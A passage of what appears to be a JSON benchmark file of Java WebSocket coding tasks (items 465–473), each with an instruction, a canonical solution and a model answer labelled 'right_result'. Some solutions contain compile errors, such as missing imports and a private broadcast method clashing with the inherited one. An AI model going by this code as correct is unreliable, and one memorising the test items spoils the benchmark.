    "right_result": "```java\nimport org.java_websocket.client.WebSocketClient;\nimport org.java_websocket.handshake.ServerHandshake;\nimport org.java_websocket.framing.Framedata;\nimport org.java_websocket.handshake.ClientHandshakeBuilder;\nimport org.java_websocket.drafts.Draft;\n\nimport javax.net.ssl.SSLSocketFactory;\nimport java.net.URI;\nimport java.net.URISyntaxException;\nimport java.util.Map;\n\npublic class WebSocketTransport extends WebSocketClient {\n    public static final int CONNECT_TIMEOUT = 5000;\n    private final WebSocketListener webSocketListener;\n\n    public interface WebSocketListener {\n        void onOpen();\n        void onMessage(String s);\n        void onClose(int code, String reason, boolean remote);\n        void onError(Exception e);\n    }\n\n    public WebSocketTransport(String serverUri, HttpConfiguration.SSLProperties sslProperties, Map<String, String> headers, WebSocketListener webSocketListener) throws URISyntaxException {\n        super(new URI(serverUri));\n        this.webSocketListener = webSocketListener;\n        setConnectionTimeout(CONNECT_TIMEOUT);\n\n        if (sslProperties != null && getWebSocket() instanceof WebSocketImpl) {\n            ((WebSocketImpl)getWebSocket()).setSSLSocketFactory(sslProperties.getSocketFactory());\n        }\n\n        for (Map.Entry<String, String> entry : headers.entrySet()) {\n            addHeader(entry.getKey(), entry.getValue());\n        }\n    }\n\n    @Override\n    public void onOpen(ServerHandshake serverHandshake) {\n        webSocketListener.onOpen();\n    }\n\n    @Override\n    public void onMessage(String s) {\n        webSocketListener.onMessage(s);\n    }\n\n    @Override\n    public void onClose(int code, String reason, boolean remote) {\n        webSocketListener.onClose(code, reason, remote);\n    }\n\n    @Override\n    public void onError(Exception ex) {\n        webSocketListener.onError(ex);\n    }\n}\n```"
  },
  {
    "Task_id": 465,
    "Instruction": "Task Description: Create a WebSocket client class in Java using the org.java_websocket library to establish a connection to a WebSocket server, handle incoming messages, and manage connection events.\n\nClass Description: The TestWebSocket class extends WebSocketClient to create a WebSocket client that connects to a specified localhost port. It overrides key WebSocket event-handling methods to manage connection lifecycle events, message reception, and errors.\n\nAttributes:\n- None (The class inherits all necessary attributes from WebSocketClient)\n\nMethods:\n- Constructor: TestWebSocket(int port) throws URISyntaxException - Initializes the WebSocket client with the specified port, constructing the WebSocket URI as \"ws://localhost:[port]\".\n- onOpen: onOpen(ServerHandshake handshakedata) -> void - Called when the WebSocket connection is successfully established.\n- onMessage: onMessage(String message) -> void - Called when a text message is received from the server.\n- onMessage: onMessage(ByteBuffer message) -> void - Called when a binary message is received from the server.\n- onClose: onClose(int code, String reason, boolean remote) -> void - Called when the WebSocket connection is closed.\n- onError: onError(Exception ex) -> void - Called when an error occurs on the WebSocket connection.",
    "Canonical_solution": "import java.net.URI;\nimport java.net.URISyntaxException;\nimport java.nio.ByteBuffer;\nimport org.java_websocket.client.WebSocketClient;\nimport org.java_websocket.handshake.ServerHandshake;\n\npublic class TestWebSocket extends WebSocketClient {\n\n    public TestWebSocket(int port) throws URISyntaxException {\n        super(new URI(\"ws://localhost:\" + port));\n    }\n\n    @Override\n    public void onOpen(ServerHandshake handshakedata) {\n    }\n\n    @Override\n    public void onMessage(String message) {\n    }\n\n    @Override\n    public void onMessage(ByteBuffer message) {\n    }\n\n    @Override\n    public void onClose(int code, String reason, boolean remote) {\n    }\n\n    @Override\n    public void onError(Exception ex) {\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 27,
    "right_result": "```java\nimport org.java_websocket.client.WebSocketClient;\nimport org.java_websocket.handshake.ServerHandshake;\n\nimport java.net.URI;\nimport java.net.URISyntaxException;\nimport java.nio.ByteBuffer;\n\npublic class TestWebSocket extends WebSocketClient {\n\n    public TestWebSocket(int port) throws URISyntaxException {\n        super(new URI(\"ws://localhost:\" + port));\n    }\n\n    @Override\n    public void onOpen(ServerHandshake handshakedata) {\n        System.out.println(\"Connection opened\");\n    }\n\n    @Override\n    public void onMessage(String message) {\n        System.out.println(\"Received text message: \" + message);\n    }\n\n    @Override\n    public void onMessage(ByteBuffer message) {\n        byte[] bytes = new byte[message.remaining()];\n        message.get(bytes);\n        System.out.println(\"Received binary message (bytes): \" + java.util.Arrays.toString(bytes));\n    }\n\n    @Override\n    public void onClose(int code, String reason, boolean remote) {\n        System.out.println(\"Connection closed. Code: \" + code + \", Reason: \" + reason + \", Remote: \" + remote);\n    }\n\n    @Override\n    public void onError(Exception ex) {\n        System.err.println(\"Error occurred: \" + ex.getMessage());\n        ex.printStackTrace();\n    }\n}\n```"
  },
  {
    "Task_id": 466,
    "Instruction": "Task Description: Implement a WebSocket client class in Java using the org.java_websocket library to establish a WebSocket connection, handle connection events, and manage message exchange with a WebSocket server.\n\nClass Description: The MyWebSocketClient class extends WebSocketClient to create a WebSocket client that connects to a specified URI. It overrides key WebSocket event-handling methods to manage connection lifecycle events and message processing. The class uses a CountDownLatch to synchronize thread operations during connection closure.\n\nAttributes:\n- onCloseLatch: CountDownLatch - A synchronization aid that allows one or more threads to wait until a set of operations being performed in other threads completes, specifically used to signal when the WebSocket connection is closed.\n\nMethods:\n- MyWebSocketClient(URI uri, CountDownLatch latch) -> None - Constructor that initializes the WebSocket client with the server URI and a CountDownLatch for connection closure synchronization.\n- onOpen(ServerHandshake handshakedata) -> None - Callback method invoked when a WebSocket connection is successfully established.\n- onMessage(String message) -> None - Callback method invoked when a message is received from the WebSocket server.\n- onClose(int code, String reason, boolean remote) -> None - Callback method invoked when the WebSocket connection is closed, triggers the CountDownLatch.\n- onError(Exception ex) -> None - Callback method invoked when an error occurs on the WebSocket connection.",
    "Canonical_solution": "import org.java_websocket.client.WebSocketClient;\nimport org.java_websocket.handshake.ServerHandshake;\nimport java.net.URI;\nimport java.util.concurrent.CountDownLatch;\n\npublic class MyWebSocketClient extends WebSocketClient {\n    private final CountDownLatch onCloseLatch;\n\n    public MyWebSocketClient(URI uri, CountDownLatch latch) {\n        super(uri);\n        onCloseLatch = latch;\n    }\n\n    @Override\n    public void onOpen(ServerHandshake handshakedata) {\n        // Connection opened callback\n    }\n\n    @Override\n    public void onMessage(String message) {\n        // Message received callback\n    }\n\n    @Override\n    public void onClose(int code, String reason, boolean remote) {\n        onCloseLatch.countDown();\n    }\n\n    @Override\n    public void onError(Exception ex) {\n        // Error handling callback\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 27,
    "right_result": "```java\nimport org.java_websocket.client.WebSocketClient;\nimport org.java_websocket.handshake.ServerHandshake;\n\nimport java.net.URI;\nimport java.util.concurrent.CountDownLatch;\n\npublic class MyWebSocketClient extends WebSocketClient {\n\n    private final CountDownLatch onCloseLatch;\n\n    public MyWebSocketClient(URI uri, CountDownLatch latch) {\n        super(uri);\n        this.onCloseLatch = latch;\n    }\n\n    @Override\n    public void onOpen(ServerHandshake handshakedata) {\n        System.out.println(\"WebSocket connection opened.\");\n    }\n\n    @Override\n    public void onMessage(String message) {\n        System.out.println(\"Received message: \" + message);\n    }\n\n    @Override\n    public void onClose(int code, String reason, boolean remote) {\n        System.out.println(\"WebSocket connection closed. Code: \" + code + \", Reason: \" + reason);\n        onCloseLatch.countDown();\n    }\n\n    @Override\n    public void onError(Exception ex) {\n        System.err.println(\"WebSocket error occurred: \" + ex.getMessage());\n    }\n}\n```"
  },
  {
    "Task_id": 467,
    "Instruction": "Task Description: Implement a secure WebSocket client class in Java that supports SSL/TLS with configurable endpoint identification algorithm for secure communication.\n\nClass Description: SSLWebSocketClient is a WebSocket client implementation that extends the WebSocketClient class from org.java_websocket library. It provides SSL/TLS support with customizable endpoint identification algorithm for secure WebSocket connections. The class includes event handlers for WebSocket lifecycle events and SSL-specific error handling.\n\nAttributes:\n- endpointIdentificationAlgorithm: String - The algorithm used for endpoint identification during SSL handshake\n- onSSLError: boolean - Flag indicating whether an SSL error occurred during connection\n- onOpen: boolean - Flag indicating whether the WebSocket connection was successfully opened\n\nMethods:\n- SSLWebSocketClient(String address, int port, String endpointIdentificationAlgorithm) -> None - Constructor that initializes the WebSocket client with server address, port, and endpoint identification algorithm\n- onOpen(ServerHandshake handshakedata) -> void - Callback triggered when WebSocket connection is successfully opened\n- onMessage(String message) -> void - Callback triggered when a message is received from the server\n- onClose(int code, String reason, boolean remote) -> void - Callback triggered when WebSocket connection is closed\n- onError(Exception ex) -> void - Callback triggered when an error occurs, with special handling for SSL errors\n- onSetSSLParameters(SSLParameters sslParameters) -> void - Override method to configure SSL parameters including endpoint identification algorithm",
    "Canonical_solution": "import java.net.URI;\nimport javax.net.ssl.SSLParameters;\nimport org.java_websocket.client.WebSocketClient;\nimport org.java_websocket.handshake.ServerHandshake;\n\npublic class SSLWebSocketClient extends WebSocketClient {\n\n    private final String endpointIdentificationAlgorithm;\n    public boolean onSSLError = false;\n    public boolean onOpen = false;\n\n    public SSLWebSocketClient(String address, int port, String endpointIdentificationAlgorithm)\n        throws java.net.URISyntaxException {\n        super(new URI(\"wss://\" + address + ':' + port));\n        this.endpointIdentificationAlgorithm = endpointIdentificationAlgorithm;\n    }\n\n    @Override\n    public void onOpen(ServerHandshake handshakedata) {\n        this.onOpen = true;\n    }\n\n    @Override\n    public void onMessage(String message) {\n    }\n\n    @Override\n    public void onClose(int code, String reason, boolean remote) {\n    }\n\n    @Override\n    public void onError(Exception ex) {\n        if (ex instanceof javax.net.ssl.SSLHandshakeException) {\n            this.onSSLError = true;\n        }\n    }\n\n    @Override\n    protected void onSetSSLParameters(SSLParameters sslParameters) {\n        super.onSetSSLParameters(sslParameters);\n        if (endpointIdentificationAlgorithm != null) {\n            sslParameters.setEndpointIdentificationAlgorithm(endpointIdentificationAlgorithm);\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 27,
    "right_result": "```java\nimport org.java_websocket.client.WebSocketClient;\nimport org.java_websocket.handshake.ServerHandshake;\n\nimport javax.net.ssl.SSLParameters;\nimport java.net.URI;\nimport java.net.URISyntaxException;\n\npublic class SSLWebSocketClient extends WebSocketClient {\n    private final String endpointIdentificationAlgorithm;\n    private boolean onSSLError = false;\n    private boolean onOpen = false;\n\n    public SSLWebSocketClient(String address, int port, String endpointIdentificationAlgorithm) throws URISyntaxException {\n        super(new URI(\"wss://\" + address + \":\" + port));\n        this.endpointIdentificationAlgorithm = endpointIdentificationAlgorithm;\n    }\n\n    @Override\n    public void onOpen(ServerHandshake handshakedata) {\n        onOpen = true;\n        System.out.println(\"Connection opened: \" + getURI());\n    }\n\n    @Override\n    public void onMessage(String message) {\n        System.out.println(\"Received message: \" + message);\n    }\n\n    @Override\n    public void onClose(int code, String reason, boolean remote) {\n        System.out.println(\"Connection closed: Code=\" + code + \", Reason=\" + reason + \", Remote=\" + remote);\n    }\n\n    @Override\n    public void onError(Exception ex) {\n        if (ex.getMessage().contains(\"SSL\")) {\n            onSSLError = true;\n            System.err.println(\"SSL error occurred: \" + ex.getMessage());\n        } else {\n            System.err.println(\"Error occurred: \" + ex.getMessage());\n        }\n    }\n\n    @Override\n    public void onSetSSLParameters(SSLParameters sslParameters) {\n        sslParameters.setEndpointIdentificationAlgorithm(endpointIdentificationAlgorithm);\n    }\n}\n```"
  },
  {
    "Task_id": 468,
    "Instruction": "Task Description: Implement a WebSocket server class in Java using the org.java_websocket library to handle client connections, messages, disconnections, and errors.\n\nClass Description: MyWebSocketServer is a custom WebSocket server implementation that extends the WebSocketServer class from org.java_websocket. It provides lifecycle methods for managing WebSocket connections and includes a CountDownLatch for server startup synchronization.\n\nAttributes:\n- serverLatch: CountDownLatch - Used to signal when the server has started (nullable)\n\nMethods:\n- Constructor: MyWebSocketServer(InetSocketAddress address, int decodercount, List<Draft> drafts, Collection<WebSocket> connectionscontainer) -> void - Creates a server instance with specified address, decoder count, protocol drafts, and connection container\n- Constructor: MyWebSocketServer(int port, CountDownLatch serverLatch) -> void - Creates a server instance with specified port and startup latch\n- Constructor: MyWebSocketServer(int port) -> void - Creates a server instance with specified port (no latch)\n- onOpen(WebSocket conn, ClientHandshake handshake) -> void - Called when a new client connects\n- onClose(WebSocket conn, int code, String reason, boolean remote) -> void - Called when a client disconnects\n- onMessage(WebSocket conn, String message) -> void - Called when a message is received from a client\n- onError(WebSocket conn, Exception ex) -> void - Called when an error occurs\n- onStart() -> void - Called when the server starts successfully",
    "Canonical_solution": "import java.net.InetSocketAddress;\nimport java.util.Collection;\nimport java.util.List;\nimport org.java_websocket.WebSocket;\nimport org.java_websocket.handshake.ClientHandshake;\nimport org.java_websocket.server.WebSocketServer;\n\npublic class MyWebSocketServer extends WebSocketServer {\n\n    private CountDownLatch serverLatch = null;\n\n    public MyWebSocketServer(InetSocketAddress address, int decodercount, List<Draft> drafts,\n        Collection<WebSocket> connectionscontainer) {\n      super(address, decodercount, drafts, connectionscontainer);\n    }\n\n    public MyWebSocketServer(int port, CountDownLatch serverLatch) {\n      super(new InetSocketAddress(port));\n      this.serverLatch = serverLatch;\n    }\n\n    public MyWebSocketServer(int port) {\n      this(port, null);\n    }\n\n    @Override\n    public void onOpen(WebSocket conn, ClientHandshake handshake) {\n    }\n\n    @Override\n    public void onClose(WebSocket conn, int code, String reason, boolean remote) {\n    }\n\n    @Override\n    public void onMessage(WebSocket conn, String message) {\n    }\n\n    @Override\n    public void onError(WebSocket conn, Exception ex) {\n      ex.printStackTrace();\n    }\n\n    @Override\n    public void onStart() {\n      if (serverLatch != null) {\n        serverLatch.countDown();\n      }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 28,
    "right_result": "```java\nimport org.java_websocket.WebSocket;\nimport org.java_websocket.drafts.Draft;\nimport org.java_websocket.handshake.ClientHandshake;\nimport org.java_websocket.server.WebSocketServer;\n\nimport java.net.InetSocketAddress;\nimport java.util.Collection;\nimport java.util.List;\nimport java.util.concurrent.CountDownLatch;\n\npublic class MyWebSocketServer extends WebSocketServer {\n    private CountDownLatch serverLatch;\n\n    public MyWebSocketServer(InetSocketAddress address, int decodercount, List<Draft> drafts, Collection<WebSocket> connectionscontainer) {\n        super(address, decodercount, drafts, connectionscontainer);\n    }\n\n    public MyWebSocketServer(int port, CountDownLatch serverLatch) {\n        super(new InetSocketAddress(port));\n        this.serverLatch = serverLatch;\n    }\n\n    public MyWebSocketServer(int port) {\n        super(new InetSocketAddress(port));\n    }\n\n    @Override\n    public void onOpen(WebSocket conn, ClientHandshake handshake) {\n        System.out.println(\"New connection established: \" + conn.getRemoteSocketAddress());\n    }\n\n    @Override\n    public void onClose(WebSocket conn, int code, String reason, boolean remote) {\n        System.out.println(\"Connection closed: \" + conn.getRemoteSocketAddress() + \", Code: \" + code + \", Reason: \" + reason);\n    }\n\n    @Override\n    public void onMessage(WebSocket conn, String message) {\n        System.out.println(\"Received message from client: \" + message);\n        conn.send(\"Echo: \" + message);\n    }\n\n    @Override\n    public void onError(WebSocket conn, Exception ex) {\n        System.err.println(\"Error occurred: \" + ex.getMessage());\n        ex.printStackTrace();\n    }\n\n    @Override\n    public void onStart() {\n        System.out.println(\"Server started successfully on port: \" + getPort());\n        if (serverLatch != null) {\n            serverLatch.countDown();\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 469,
    "Instruction": "Task Description: Implement a WebSocket server class in Java using the org.java_websocket library to handle client connections, messages, disconnections, and errors, with synchronization support using CountDownLatch.\n\nClass Description: MyWebSocketServer is a custom WebSocket server implementation that extends WebSocketServer from org.java_websocket. It manages client connections and messages while providing synchronization points for server startup and message reception using CountDownLatch.\n\nAttributes:\ncountServerLatch: [CountDownLatch] - Synchronization aid to signal when the server has started  \ncountClientMessageLatch: [CountDownLatch] - Synchronization aid to signal when a client message is received  \n\nMethods:\nConstructor: [MyWebSocketServer](int port, CountDownLatch serverDownLatch, CountDownLatch countClientMessageLatch) -> [void] - Initializes the WebSocket server with specified port and synchronization latches  \nonOpen: [onOpen](WebSocket conn, ClientHandshake handshake) -> [void] - Callback for new client connections  \nonClose: [onClose](WebSocket conn, int code, String reason, boolean remote) -> [void] - Callback for client disconnections  \nonMessage: [onMessage](WebSocket conn, String message) -> [void] - Callback for processing received messages (decrements message latch)  \nonError: [onError](WebSocket conn, Exception ex) -> [void] - Callback for error handling (prints stack trace)  \nonStart: [onStart]() -> [void] - Callback when server starts (decrements server latch)",
    "Canonical_solution": "import java.net.InetSocketAddress;\nimport org.java_websocket.WebSocket;\nimport org.java_websocket.handshake.ClientHandshake;\nimport org.java_websocket.server.WebSocketServer;\nimport java.util.concurrent.CountDownLatch;\n\npublic class MyWebSocketServer extends WebSocketServer {\n\n    private final CountDownLatch countServerLatch;\n    private final CountDownLatch countClientMessageLatch;\n\n    public MyWebSocketServer(int port, CountDownLatch serverDownLatch,\n        CountDownLatch countClientMessageLatch) {\n        super(new InetSocketAddress(port));\n        this.countServerLatch = serverDownLatch;\n        this.countClientMessageLatch = countClientMessageLatch;\n    }\n\n    @Override\n    public void onOpen(WebSocket conn, ClientHandshake handshake) {\n    }\n\n    @Override\n    public void onClose(WebSocket conn, int code, String reason, boolean remote) {\n    }\n\n    @Override\n    public void onMessage(WebSocket conn, String message) {\n        countClientMessageLatch.countDown();\n    }\n\n    @Override\n    public void onError(WebSocket conn, Exception ex) {\n        ex.printStackTrace();\n    }\n\n    @Override\n    public void onStart() {\n        countServerLatch.countDown();\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 28,
    "right_result": "```java\nimport org.java_websocket.WebSocket;\nimport org.java_websocket.handshake.ClientHandshake;\nimport org.java_websocket.server.WebSocketServer;\nimport java.net.InetSocketAddress;\nimport java.util.concurrent.CountDownLatch;\n\npublic class MyWebSocketServer extends WebSocketServer {\n\n    private final CountDownLatch countServerLatch;\n    private final CountDownLatch countClientMessageLatch;\n\n    public MyWebSocketServer(int port, CountDownLatch serverDownLatch, CountDownLatch countClientMessageLatch) {\n        super(new InetSocketAddress(port));\n        this.countServerLatch = serverDownLatch;\n        this.countClientMessageLatch = countClientMessageLatch;\n    }\n\n    @Override\n    public void onOpen(WebSocket conn, ClientHandshake handshake) {\n        System.out.println(\"New connection established: \" + conn.getRemoteSocketAddress());\n    }\n\n    @Override\n    public void onClose(WebSocket conn, int code, String reason, boolean remote) {\n        System.out.println(\"Connection closed: \" + conn.getRemoteSocketAddress() + \", Code: \" + code + \", Reason: \" + reason);\n    }\n\n    @Override\n    public void onMessage(WebSocket conn, String message) {\n        System.out.println(\"Received message from client: \" + message);\n        if (countClientMessageLatch != null && countClientMessageLatch.getCount() > 0) {\n            countClientMessageLatch.countDown();\n        }\n    }\n\n    @Override\n    public void onError(WebSocket conn, Exception ex) {\n        ex.printStackTrace();\n    }\n\n    @Override\n    public void onStart() {\n        System.out.println(\"WebSocket server started successfully.\");\n        if (countServerLatch != null && countServerLatch.getCount() > 0) {\n            countServerLatch.countDown();\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 470,
    "Instruction": "Task Description: Implement a WebSocket server class for handling real-time communication between clients, including connection management, message broadcasting, and error handling.\n\nClass Description: ChatServer is a WebSocket server implementation that extends WebSocketServer from org.java_websocket library. It manages client connections, processes incoming messages (both text and binary), broadcasts messages to all connected clients, and handles connection events and errors.\n\nAttributes:\n- (Inherited from WebSocketServer) port: int - The port number on which the server listens\n- (Inherited from WebSocketServer) address: InetSocketAddress - The network address of the server\n- (Inherited from WebSocketServer) draft: Draft_6455 - The WebSocket protocol draft being used\n\nMethods:\n- ChatServer(int port) -> None - Constructor that initializes the server with specified port\n- ChatServer(InetSocketAddress address) -> None - Constructor that initializes the server with specified socket address\n- ChatServer(int port, Draft_6455 draft) -> None - Constructor that initializes the server with specified port and protocol draft\n- onOpen(WebSocket conn, ClientHandshake handshake) -> void - Handles new client connections, sends welcome message, and notifies other clients\n- onClose(WebSocket conn, int code, String reason, boolean remote) -> void - Handles client disconnections and notifies other clients\n- onMessage(WebSocket conn, String message) -> void - Processes incoming text messages and broadcasts to all clients\n- onMessage(WebSocket conn, ByteBuffer message) -> void - Processes incoming binary messages and broadcasts to all clients\n- onError(WebSocket conn, Exception ex) -> void - Handles errors that occur during WebSocket operations\n- onStart() -> void - Initializes server settings when the server starts",
    "Canonical_solution": "import java.net.InetSocketAddress;\nimport java.nio.ByteBuffer;\nimport java.util.Collections;\nimport org.java_websocket.WebSocket;\nimport org.java_websocket.drafts.Draft;\nimport org.java_websocket.drafts.Draft_6455;\nimport org.java_websocket.handshake.ClientHandshake;\nimport org.java_websocket.server.WebSocketServer;\n\npublic class ChatServer extends WebSocketServer {\n\n    public ChatServer(int port) {\n        super(new InetSocketAddress(port));\n    }\n\n    public ChatServer(InetSocketAddress address) {\n        super(address);\n    }\n\n    public ChatServer(int port, Draft_6455 draft) {\n        super(new InetSocketAddress(port), Collections.<Draft>singletonList(draft));\n    }\n\n    @Override\n    public void onOpen(WebSocket conn, ClientHandshake handshake) {\n        conn.send(\"Welcome to the server!\");\n        broadcast(\"new connection: \" + handshake.getResourceDescriptor());\n        System.out.println(conn.getRemoteSocketAddress().getAddress().getHostAddress() + \" entered the room!\");\n    }\n\n    @Override\n    public void onClose(WebSocket conn, int code, String reason, boolean remote) {\n        broadcast(conn + \" has left the room!\");\n        System.out.println(conn + \" has left the room!\");\n    }\n\n    @Override\n    public void onMessage(WebSocket conn, String message) {\n        broadcast(message);\n        System.out.println(conn + \": \" + message);\n    }\n\n    @Override\n    public void onMessage(WebSocket conn, ByteBuffer message) {\n        broadcast(message.array());\n        System.out.println(conn + \": \" + message);\n    }\n\n    @Override\n    public void onError(WebSocket conn, Exception ex) {\n        ex.printStackTrace();\n    }\n\n    @Override\n    public void onStart() {\n        System.out.println(\"Server started!\");\n        setConnectionLostTimeout(100);\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 28,
    "right_result": "```java\nimport org.java_websocket.WebSocket;\nimport org.java_websocket.handshake.ClientHandshake;\nimport org.java_websocket.server.WebSocketServer;\nimport org.java_websocket.drafts.Draft_6455;\n\nimport java.net.InetSocketAddress;\nimport java.nio.ByteBuffer;\n\npublic class ChatServer extends WebSocketServer {\n\n    public ChatServer(int port) {\n        super(new InetSocketAddress(port));\n    }\n\n    public ChatServer(InetSocketAddress address) {\n        super(address);\n    }\n\n    public ChatServer(int port, Draft_6455 draft) {\n        super(new InetSocketAddress(port), draft);\n    }\n\n    @Override\n    public void onOpen(WebSocket conn, ClientHandshake handshake) {\n        System.out.println(\"New connection: \" + conn.getRemoteSocketAddress());\n        conn.send(\"Welcome to the chat server!\");\n        broadcast(\"A new user has joined the chat.\");\n    }\n\n    @Override\n    public void onClose(WebSocket conn, int code, String reason, boolean remote) {\n        System.out.println(\"Connection closed: \" + conn.getRemoteSocketAddress() + \" (\" + reason + \")\");\n        broadcast(\"A user has left the chat.\");\n    }\n\n    @Override\n    public void onMessage(WebSocket conn, String message) {\n        System.out.println(\"Received text message: \" + message);\n        broadcast(\"User: \" + message);\n    }\n\n    @Override\n    public void onMessage(WebSocket conn, ByteBuffer message) {\n        byte[] bytes = new byte[message.remaining()];\n        message.get(bytes);\n        System.out.println(\"Received binary message of length: \" + bytes.length);\n        broadcastBinary(message);\n    }\n\n    @Override\n    public void onError(WebSocket conn, Exception ex) {\n        System.err.println(\"An error occurred for connection: \" + conn.getRemoteSocketAddress());\n        ex.printStackTrace();\n    }\n\n    @Override\n    public void onStart() {\n        System.out.println(\"Chat server started on port \" + getPort());\n    }\n\n    private void broadcast(String message) {\n        for (WebSocket client : getConnections()) {\n            client.send(message);\n        }\n    }\n\n    private void broadcastBinary(ByteBuffer message) {\n        for (WebSocket client : getConnections()) {\n            client.send(message);\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 471,
    "Instruction": "Task Description: Create a WebSocket server implementation using org.java_websocket library to handle client connections, messages, disconnections, and errors.\n\nClass Description: MyWebSocketServer is a custom WebSocket server implementation that extends the WebSocketServer class from org.java_websocket. It provides lifecycle methods for managing client connections and communication.\n\nAttributes:\n- inherited from WebSocketServer: Various internal attributes for managing server state and connections\n\nMethods:\n- Constructor: MyWebSocketServer(InetSocketAddress inetSocketAddress) -> void - Initializes the server with specified socket address\n- onOpen: onOpen(WebSocket conn, ClientHandshake handshake) -> void - Called when a new client connects\n- onClose: onClose(WebSocket conn, int code, String reason, boolean remote) -> void - Called when a client disconnects\n- onMessage: onMessage(WebSocket conn, String message) -> void - Called when a message is received from a client\n- onError: onError(WebSocket conn, Exception ex) -> void - Called when an error occurs\n- onStart: onStart() -> void - Called when the server starts successfully",
    "Canonical_solution": "import java.net.InetSocketAddress;\nimport org.java_websocket.WebSocket;\nimport org.java_websocket.handshake.ClientHandshake;\nimport org.java_websocket.server.WebSocketServer;\n\npublic class MyWebSocketServer extends WebSocketServer {\n\n    public MyWebSocketServer(InetSocketAddress inetSocketAddress) {\n        super(inetSocketAddress);\n    }\n\n    @Override\n    public void onOpen(WebSocket conn, ClientHandshake handshake) {\n        // Handle new client connection\n    }\n\n    @Override\n    public void onClose(WebSocket conn, int code, String reason, boolean remote) {\n        // Handle client disconnection\n    }\n\n    @Override\n    public void onMessage(WebSocket conn, String message) {\n        // Process received message from client\n    }\n\n    @Override\n    public void onError(WebSocket conn, Exception ex) {\n        // Handle errors\n    }\n\n    @Override\n    public void onStart() {\n        // Server startup logic\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 28,
    "right_result": "```java\nimport org.java_websocket.WebSocket;\nimport org.java_websocket.handshake.ClientHandshake;\nimport org.java_websocket.server.WebSocketServer;\n\nimport java.net.InetSocketAddress;\nimport java.net.UnknownHostException;\n\npublic class MyWebSocketServer extends WebSocketServer {\n\n    public MyWebSocketServer(InetSocketAddress inetSocketAddress) throws UnknownHostException {\n        super(inetSocketAddress);\n    }\n\n    @Override\n    public void onOpen(WebSocket conn, ClientHandshake handshake) {\n        System.out.println(\"New connection from \" + conn.getRemoteSocketAddress());\n    }\n\n    @Override\n    public void onClose(WebSocket conn, int code, String reason, boolean remote) {\n        System.out.println(\"Connection closed: \" + conn.getRemoteSocketAddress() + \", Code: \" + code + \", Reason: \" + reason);\n    }\n\n    @Override\n    public void onMessage(WebSocket conn, String message) {\n        System.out.println(\"Received message from \" + conn.getRemoteSocketAddress() + \": \" + message);\n        conn.send(\"Echo: \" + message);\n    }\n\n    @Override\n    public void onError(WebSocket conn, Exception ex) {\n        System.err.println(\"Error occurred with connection \" + conn.getRemoteSocketAddress());\n        ex.printStackTrace();\n    }\n\n    @Override\n    public void onStart() {\n        System.out.println(\"Server started successfully on port \" + getPort());\n    }\n}\n```"
  },
  {
    "Task_id": 472,
    "Instruction": "Task Description: Implement a WebSocket server using the org.java_websocket library to handle client connections, messages, disconnections, and errors.\n\nClass Description: MyWebSocketServer is a custom WebSocket server implementation that extends the WebSocketServer class from the org.java_websocket library. It provides lifecycle methods for managing client connections and communication.\n\nAttributes:\n- countServerLatch: CountDownLatch - A synchronization aid that allows one or more threads to wait until a set of operations being performed in other threads completes.\n\nMethods:\n- MyWebSocketServer(int port, CountDownLatch serverDownLatch) -> None - Constructor that initializes the WebSocket server with the specified port and CountDownLatch.\n- onOpen(WebSocket conn, ClientHandshake handshake) -> None - Called when a new client connection is established.\n- onClose(WebSocket conn, int code, String reason, boolean remote) -> None - Called when a client connection is closed.\n- onMessage(WebSocket conn, String message) -> None - Called when a message is received from a client.\n- onError(WebSocket conn, Exception ex) -> None - Called when an error occurs.\n- onStart() -> None - Called when the server starts successfully.",
    "Canonical_solution": "import java.net.InetSocketAddress;\nimport org.java_websocket.WebSocket;\nimport org.java_websocket.handshake.ClientHandshake;\nimport org.java_websocket.server.WebSocketServer;\nimport java.util.concurrent.CountDownLatch;\n\npublic class MyWebSocketServer extends WebSocketServer {\n\n    private final CountDownLatch countServerLatch;\n\n    public MyWebSocketServer(int port, CountDownLatch serverDownLatch) {\n        super(new InetSocketAddress(port));\n        this.countServerLatch = serverDownLatch;\n    }\n\n    @Override\n    public void onOpen(WebSocket conn, ClientHandshake handshake) {\n        // Handle new client connection\n    }\n\n    @Override\n    public void onClose(WebSocket conn, int code, String reason, boolean remote) {\n        // Handle client disconnection\n    }\n\n    @Override\n    public void onMessage(WebSocket conn, String message) {\n        // Process received message\n    }\n\n    @Override\n    public void onError(WebSocket conn, Exception ex) {\n        // Handle errors\n        ex.printStackTrace();\n    }\n\n    @Override\n    public void onStart() {\n        // Server startup complete\n        countServerLatch.countDown();\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 28,
    "right_result": "```java\nimport org.java_websocket.WebSocket;\nimport org.java_websocket.handshake.ClientHandshake;\nimport org.java_websocket.server.WebSocketServer;\nimport java.net.InetSocketAddress;\nimport java.util.concurrent.CountDownLatch;\n\npublic class MyWebSocketServer extends WebSocketServer {\n\n    private final CountDownLatch countServerLatch;\n\n    public MyWebSocketServer(int port, CountDownLatch serverDownLatch) {\n        super(new InetSocketAddress(port));\n        this.countServerLatch = serverDownLatch;\n    }\n\n    @Override\n    public void onOpen(WebSocket conn, ClientHandshake handshake) {\n        System.out.println(\"New connection established: \" + conn.getRemoteSocketAddress());\n    }\n\n    @Override\n    public void onClose(WebSocket conn, int code, String reason, boolean remote) {\n        System.out.println(\"Connection closed: \" + conn.getRemoteSocketAddress() + \" Reason: \" + reason);\n    }\n\n    @Override\n    public void onMessage(WebSocket conn, String message) {\n        System.out.println(\"Received message from client: \" + message);\n        conn.send(\"Echo: \" + message);\n    }\n\n    @Override\n    public void onError(WebSocket conn, Exception ex) {\n        System.err.println(\"An error occurred: \" + ex.getMessage());\n        ex.printStackTrace();\n    }\n\n    @Override\n    public void onStart() {\n        System.out.println(\"WebSocket server started successfully.\");\n        if (countServerLatch != null) {\n            countServerLatch.countDown();\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 473,
